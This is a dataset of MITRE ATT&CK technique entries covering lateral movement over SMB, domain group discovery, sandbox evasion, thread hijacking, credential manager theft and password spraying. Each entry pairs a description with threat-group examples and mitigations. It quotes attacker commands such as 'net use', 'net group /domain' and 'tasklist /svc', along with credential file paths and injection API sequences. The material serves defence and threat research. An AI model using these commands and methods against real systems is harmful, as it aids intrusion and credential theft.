{"text": " Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection. A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces. Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018)", "idx": "https://attack.mitre.org/techniques/T1537", "title": "Transfer Data to Cloud Account", "entity": "Transfer Data to Cloud Account", "entity_type": "techniques", "entity_context": ["Implement network-based filtering restrictions to prohibit data transfers to untrusted VPCs.", "Limit user account and IAM policies to the least privileges required. Consider using temporary credentials for accounts that are only valid for a certain period of time to reduce the effectiveness of compromised accounts.", "Consider rotating access keys within a certain number of days to reduce the effectiveness of stolen credentials."], "is_subtechnique": false}
{"text": " Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user. SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba. Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)", "idx": "https://attack.mitre.org/techniques/T1021/002", "title": "SMB/Windows Admin Shares", "entity": "SMB/Windows Admin Shares", "entity_type": "techniques", "entity_context": ["Threat Group-1314 actors mapped network drives using <code>net use</code>.", "Shamoon accesses network share(s), enables share access to the target device, copies an executable payload to the target system, and uses a Scheduled Task/Job to execute the malware.", "Lateral movement can be done with Net through <code>net use</code> commands to connect to the on remote systems.", "Consider disabling Windows administrative shares.", "APT28 has mapped network drives using Net and administrator credentials.", "Sandworm Team has run <code>net use</code> to connect to network shares. ", "Olympic Destroyer uses PsExec to interact with the <code>ADMIN$</code> network share to execute commands on remote systems.", "Net Crawler uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.", "FIN8 has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context.", "APT41 has transferred implant files using Windows Admin Shares.", "Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.", "Stuxnet propagates to available network shares.", "BlackEnergy has run a plug-in on a victim to spread through the local network by using PsExec and accessing admin shares.", "APT3 will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.", "NotPetya can use PsExec, which interacts with the <code>ADMIN$</code> network share to execute commands on remote systems.", "Cobalt Strike can use Window admin shares (C$ and ADMIN$) for lateral movement.", "Consider using the host firewall to restrict file sharing communications such as SMB. ", "Blue Mockingbird has used Windows Explorer to manually copy malicious files to remote hosts over SMB.", "Wizard Spider has used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement.", "Emotet leverages the Admin$ share for lateral movement once the local admin password has been brute forced.  ", "Orangeworm has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.", "The Regin malware platform can use Windows admin shares to move laterally.", "PsExec, a tool that has been used by adversaries, writes programs to the <code>ADMIN$</code> network share to execute commands on remote systems.", "Anchor can support windows execution via SMB shares.", "Fox Kitten has used valid accounts to access SMB shares.", "Operation Wocao has used Impacket's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally.", "APT32 used Net to use Windows' hidden network shares to copy their tools to remote machines for execution.", "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.", "Turla used <code>net use</code> commands to connect to lateral systems within a network.", "Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed.", "Deep Panda uses net.exe to connect to network shares using <code>net use</code> commands with compromised credentials.", "Ke3chang actors have been known to copy files to the network shares of other computers to move laterally.", "Conficker variants spread through NetBIOS share propagation.", "Ryuk has used the C$ network share for lateral movement.", "Lucifer can infect victims by brute forcing SMB.", "APT39 has used SMB for lateral movement.", "zwShell has been copied over network shares to move laterally.", "Lazarus Group malware SierraAlfa accesses the <code>ADMIN$</code> share via SMB to conduct lateral movement.", "Chimera has used Windows admin shares to move laterally.", "Kwampirs copies itself over network shares to move laterally on a victim network.", "Conti can spread via SMB and encrypts files on different hosts, potentially compromising an entire network."], "is_subtechnique": true}
{"text": " Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files.", "idx": "https://attack.mitre.org/techniques/T1119", "title": "Automated Collection", "entity": "Automated Collection", "entity_type": "techniques", "entity_context": ["Crutch can automatically monitor removable drives in a loop and copy interesting files.", "Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means.", "Bankshot recursively generates a list of files within a directory and sends them back to the control server.", "Proxysvc automatically collects data about the victim and sends it to the control server.", "FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.", "StrongPity has a file searcher component that can automatically collect and archive files based on a predefined list of file extensions.", "TajMahal has the ability to index and compress files into a send queue for exfiltration.", "APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.", "InvisiMole can sort and collect specific documents as well as generate a list of all files on a newly inserted drive and store them in an encrypted file.", "MESSAGETAP checks two files, keyword_parm.txt and parm.txt, for instructions on how to target and save data parsed and extracted from SMS message data from the network traffic. If an SMS message contained either a phone number, IMSI number, or keyword that matched the predefined list, it is saved to a CSV file for later theft by the threat actor.", "Patchwork developed a file stealer to search C:\\ and collect files with certain extensions. Patchwork also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.", "NETWIRE can automatically archive collected data.", "Micropsia executes an RAR tool to recursively archive files based on a predefined list of file extensions (*.xls, *.xlsx, *.csv, *.odt, *.doc, *.docx, *.ppt, *.pptx, *.pdf, *.mdb, *.accdb, *.accde, *.txt).", "Attor has automatically collected data about the compromised system.", "FIN6 has used a script to iterate through a list of compromised PoS systems, copy and remove data to a log file, and to bind to events from the submit payment button.", "OilRig has used automated collection.", "Mustang Panda used custom batch scripts to collect files automatically from a targeted system.", "A Helminth VBScript receives a batch script to execute a set of commands in a command prompt.", "Valak can download a module to search for and build a report of harvested credential data.", "Frankenstein has enumerated hosts via Empire, gathering the username, domain name, machine name, and other system information.", "Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.", "WindTail can identify and add files that possess specific file extensions to an array for archiving.", "Tropic Trooper has collected information automatically using the adversary's USBferry attack.\t", "VERMIN saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .", "ShimRatReporter gathered information automatically, without instruction from a C2, related to the user and host machine that is compiled into a report and sent to the operators.", "RTM monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.", "Metamorfo has automatically collected mouse clicks, continuous screenshots on the machine, and set timers to collect the contents of the clipboard and website browsing. ", "menuPass has used the Csvde tool to collect Active Directory files and data.", "BADNEWS monitors USB devices and copies files with certain extensions to a predefined directory.", "T9000 searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, *.ppt, *.xls, *.docx, *.pptx, *.xlsx). Any matching files are encrypted and written to a local user directory.", "Comnie executes a batch script to store discovery information in %TEMP%\\info.dat and then uploads the temporarily file to the remote C2 server.", "APT1 used a batch script to perform a series of discovery techniques and saves it to a text file.", "For all non-removable drives on a victim, USBStealer executes automated collection of certain files for later exfiltration.", "Operation Wocao has used a script to collect information about the infected system.", "Zebrocy scans the system and automatically collects files with the following extensions: .doc, .docx, ,.xls, .xlsx, .pdf, .pptx, .rar, .zip, .jpg, .jpeg, .bmp, .tiff, .kum, .tlg, .sbx, .cr, .hse, .hsf, and .lhz.", "Gamaredon Group has deployed scripts on compromised systems that automatically scan for interesting documents.", "Sidewinder has used tools to automatically collect system and network configuration information.", "Rover automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.", "PoetRAT used file system monitoring to track modification and enable automatic exfiltration.", "GoldFinder logged and stored information related to the route or hops a packet took from a compromised machine to a hardcoded C2 server, including the target C2 URL, HTTP response/status code, HTTP response headers and values, and data received from the C2 node.  ", "PoshC2 contains a module for recursively parsing through files and directories to gather valid credit card numbers.", "Chimera has used custom DLLs for continuous retrieval of data from memory.", "LightNeuron can be configured to automatically collect files under a specified directory.", "Ramsay can conduct an initial scan for Microsoft Word documents on the local system, removable media, and connected network drives, before tagging and collecting them. It can continue tagging documents to collect with follow up scans.\t", "Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means. Strong passwords should be used on certain encrypted documents that use them to prevent offline cracking through Brute Force techniques."], "is_subtechnique": false}
{"text": " Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators. Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.", "idx": "https://attack.mitre.org/techniques/T1069/002", "title": "Domain Groups", "entity": "Domain Groups", "entity_type": "techniques", "entity_context": ["Helminth has checked for the domain admin group and Exchange Trusted Subsystem groups using the commands <code>net group Exchange Trusted Subsystem /domain</code> and <code>net group domain admins /domain</code>.", "AdFind can enumerate domain groups.", "Ke3chang performs discovery of permission groups <code>net group /domain</code>.", "SoreFang can enumerate domain groups by executing <code>net.exe group /domain</code>.", "OSInfo specifically looks for Domain Admins and power users within the domain. ", "GRIFFON has used a reconnaissance module that can be used to retrieve Windows domain membership information.", "OilRig has used <code>net group /domain</code>, <code>net group “domain admins” /domain</code>, and <code>net group “Exchange Trusted Subsystem” /domain</code> to find domain group permission settings.", "Turla has used <code>net group \"Domain Admins\" /domain</code> to identify domain administrators.", "Cobalt Strike can identify targets by querying account groups on a domain contoller.", "REvil can identify the domain membership of a compromised host.", "Kwampirs collects a list of domain groups with the command <code>net localgroup /domain</code>.", "POWRUNER may collect domain group information by running <code>net group /domain</code> or a series of other commands on a victim.", "BloodHound can collect information about domain groups and members.", "Egregor can conduct Active Directory reconnaissance using tools such as Sharphound or AdFind.", "Inception has used specific malware modules to gather domain membership.", "dsquery can be used to gather information on permission groups within a domain.", "Commands such as <code>net group /domain</code> can be used in Net to gather information about and manipulate groups.", "WellMess can identify domain group membership for the current user.", "CrackMapExec can gather the user accounts within domain groups.", "Dragonfly 2.0 used batch scripts to enumerate administrators and users in the domain."], "is_subtechnique": true}
{"text": " Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness) Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)", "idx": "https://attack.mitre.org/techniques/T1497", "title": "Virtualization/Sandbox Evasion", "entity": "Virtualization/Sandbox Evasion", "entity_type": "techniques", "entity_context": ["RTM can detect if it is running within a sandbox or other virtualized analysis environment.\t", "Bazar can attempt to overload sandbox analysis by sending 1550 calls to <code>printf</code>.", "Bisonal checks if the malware was executed within a VMware environment.", "CHOPSTICK  includes runtime checks to identify an analysis environment and prevent execution on it.", "Carberp has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software.", " Agent Tesla has he ability to perform anti-sandboxing and anti-virtualization checks.", "Egregor has used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes. ", "StoneDrill has used several anti-emulation techniques to prevent automated analysis by emulators or sandboxes.\t", "Darkhotel malware has employed just-in-time decryption of strings to evade sandbox detection.", "Metamorfo has embedded a \"vmdetect.exe\" executable to identify virtual machines at the beginning of execution. ", "Some versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.", "Hancitor has used a macro to check that an ActiveDocument shape object in the lure message is present. If this object is not found, the macro will exit without downloading additional payloads."], "is_subtechnique": false}
{"text": " Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist /svc\" using [Tasklist](https://attack.mitre.org/software/S0057), and \"net start\" using [Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as well. Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "idx": "https://attack.mitre.org/techniques/T1007", "title": "System Service Discovery", "entity": "System Service Discovery", "entity_type": "techniques", "entity_context": ["InvisiMole can obtain running services on the victim.", "Dyre has the ability to identify running services on a compromised host.", "Caterpillar WebShell can obtain a list of the services from a system. ", "GeminiDuke collects information on programs and services on the victim that are configured to automatically run at startup.", "jRAT can list local services.", "ZxShell can check the services on the system. ", "PoshC2 can enumerate service and service permission information.", "TrickBot collects a list of install programs and services on the system’s machine.", "SUNBURST collected a list of service names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.", "Tasklist can be used to discover services running on a system.", "JPIN can list running services.", "GreyEnergy enumerates all Windows services.", "RainyDay can create and register a service for execution.", "Hydraq creates a backdoor through which remote attackers can monitor services.", "Ursnif has gathered information about running services.", "LookBack can enumerate services on the victim machine.", "APT1 used the commands <code>net start</code> and <code>tasklist</code> to get a listing of the services on the system.", "Kwampirs collects a list of running services with the command <code>tasklist /svc</code>.", "Epic uses the <code>tasklist /svc</code> command to list the services on the system.", "OilRig has used <code>sc query</code> on a victim to gather information about services.", "BitPaymer can enumerate existing Windows services on the host that are configured to run as LocalSystem.", "Babuk can enumerate all services running on a compromised host.", "Chimera has used <code>net start</code> and <code>net use</code> for system service discovery.", "Emissary has the capability to execute the command <code>net start</code> to interact with services.", "BBSRAT can query service configuration information.", "HyperBro can list all services and their configurations.", "BRONZE BUTLER has used TROJ_GETVERSION to discover system services.", "Ke3chang performs service discovery using <code>net start</code> commands.", "SombRAT can enumerate services on a victim machine.", "WINERACK can enumerate services.", "SLOTHFULMEDIA has the capability to enumerate services.", "HotCroissant has the ability to retrieve a list of services on the infected host.", "Cuba can query service status using <code>QueryServiceStatusEx</code> function.", "Turla surveys a system upon check-in to discover running services and associated processes using the <code>tasklist /svc</code> command.", "Comnie runs the command: <code>net start >> %TEMP%\\info.dat</code> on a victim.", "Sykipot may use <code>net start</code> to display running services.", "S-Type runs the command <code>net start</code> on a victim.", "REvil can enumerate active services.", "admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to obtain information about services: <code>net start >> %temp%\\download</code>", "Volgmer queries the system to identify existing services.", "The <code>net start</code> command can be used in Net to find information about Windows services.", "ZLib has the ability to discover and manipulate Windows services.", "Ixeshe can list running services.", "SynAck enumerates all running services.", "After compromising a victim, Poseidon Group discovers all running services.", "RATANKBA uses <code>tasklist /svc</code> to display running tasks.", "GravityRAT has a feature to list the available services on the system.", "Cobalt Strike can enumerate services on compromised hosts.", "Elise executes <code>net start</code> after initial communication is made to the remote server.", "Operation Wocao has used the <code>tasklist</code> command to search for one of its backdoors.", "Indrik Spider has used the win32_service WMI class to retrieve a list of services from the system. "], "is_subtechnique": false}
{"text": " Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution) Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key. Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)", "idx": "https://attack.mitre.org/techniques/T1600", "title": "Weaken Encryption", "entity": "Weaken Encryption", "entity_type": "techniques", "entity_context": [], "is_subtechnique": false}
{"text": " Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors. In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).", "idx": "https://attack.mitre.org/techniques/T1588/001", "title": "Malware", "entity": "Malware", "entity_type": "techniques", "entity_context": ["APT1 used publicly available malware for privilege escalation.", "Andariel has used a variety of publicly-available remote access Trojans (RATs) for its operations.", "BackdoorDiplomacy has obtained and used leaked malware, including DoublePulsar, EternalBlue, EternalRocks, and EternalSynergy, in its operations.", "Turla has used malware obtained after compromising other threat actors, such as OilRig.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging. For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018) Adversaries may downgrade and use less-secure versions of various features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557).(Citation: Praetorian TLS Downgrade Attack 2014)", "idx": "https://attack.mitre.org/techniques/T1562/010", "title": "Downgrade Attack", "entity": "Downgrade Attack", "entity_type": "techniques", "entity_context": ["Consider removing previous versions of tools that are unnecessary to the environment when possible."], "is_subtechnique": true}
{"text": " Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017) This is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.", "idx": "https://attack.mitre.org/techniques/T1055/003", "title": "Thread Execution Hijacking", "entity": "Thread Execution Hijacking", "entity_type": "techniques", "entity_context": ["Waterbear can use thread injection to inject shellcode into the process of security software.", "Gazer performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.", "Trojan.Karagany can inject a suspended thread of its own process into a new process and initiate via the <code>ResumeThread</code> API.", "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. "], "is_subtechnique": true}
{"text": " An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots. Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)", "idx": "https://attack.mitre.org/techniques/T1578", "title": "Modify Cloud Compute Infrastructure", "entity": "Modify Cloud Compute Infrastructure", "entity_type": "techniques", "entity_context": ["Routinely monitor user permissions to ensure only the expected users have the capability to modify cloud compute infrastructure components.", "Limit permissions for creating, deleting, and otherwise altering compute components in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies."], "is_subtechnique": false}
{"text": " Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Additionally, botnets are available for rent or purchase. Use of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.", "idx": "https://attack.mitre.org/techniques/T1583", "title": "Acquire Infrastructure", "entity": "Acquire Infrastructure", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": false}
{"text": " **This technique has been deprecated and should no longer be used.** A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with [Rootkit](https://attack.mitre.org/techniques/T1014) functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.", "idx": "https://attack.mitre.org/techniques/T1062", "title": "Hypervisor", "entity": "Hypervisor", "entity_type": "techniques", "entity_context": [], "is_subtechnique": false}
{"text": " Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker) The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker. Credential Lockers store credentials in encrypted <code>.vcrd</code> files, located under <code>%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\</code>. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault) Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may gather credentials by reading files located inside of the Credential Lockers. Adversaries may also abuse Windows APIs such as <code>CredEnumerateA</code> to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager) Adversaries may use password recovery tools to obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)", "idx": "https://attack.mitre.org/techniques/T1555/004", "title": "Windows Credential Manager", "entity": "Windows Credential Manager", "entity_type": "techniques", "entity_context": ["OilRig has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager.", "Turla has gathered credentials from the Windows Credential Manager tool.\t", "ROKRAT steals credentials by leveraging the Windows Vault mechanism.", "RainyDay can use the QuarksPwDump tool to obtain local passwords and domain cached credentials.", "KGH_SPY can collect credentials from the Windows Credential Manager.", "Valak can use a .NET compiled module named exchgrabber to enumerate credentials from the Credential Manager.", "Mimikatz contains functionality to acquire credentials from the Windows Credential Manager.", "LaZagne can obtain credentials from Vault files.\t", "PowerSploit contains a collection of Exfiltration modules that can harvest credentials from Windows vault credential objects.", "Stealth Falcon malware gathers passwords from the Windows Credential Vault.", "Consider enabling the “Network access: Do not allow storage of passwords and credentials for network authentication” setting that will prevent network credentials from being stored by the Credential Manager."], "is_subtechnique": true}
{"text": " Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents) Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs). Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging", "idx": "https://attack.mitre.org/techniques/T1480/001", "title": "Environmental Keying", "entity": "Environmental Keying", "entity_type": "techniques", "entity_context": ["Equation has been observed utilizing environmental keying in payload delivery.", "APT41 has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. APT41 has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.", "InvisiMole can use Data Protection API to encrypt its components on the victim’s computer, to evade detection, and to make sure the payload can only be decrypted and loaded on one specific compromised computer.", "Environmental Keying likely should not be mitigated with preventative controls because it may protect unintended targets from being compromised. If targeted, efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior if compromised."], "is_subtechnique": true}
{"text": " Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying) Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following: * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / Terminal Services (3389/TCP) * HTTP/HTTP Management Services (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP) In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018) In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.", "idx": "https://attack.mitre.org/techniques/T1110/003", "title": "Password Spraying", "entity": "Password Spraying", "entity_type": "techniques", "entity_context": ["Sandworm Team has used a script to attempt RPC authentication against a number of hosts. ", "MailSniper can be used for password spraying against Exchange and Office 365.", "Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out.", "Lazarus Group malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.", "Linux Rabbit brute forces SSH passwords in order to attempt to gain access and install its malware onto the server. ", "APT28 has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks. APT28 has also used a Kubernetes cluster to 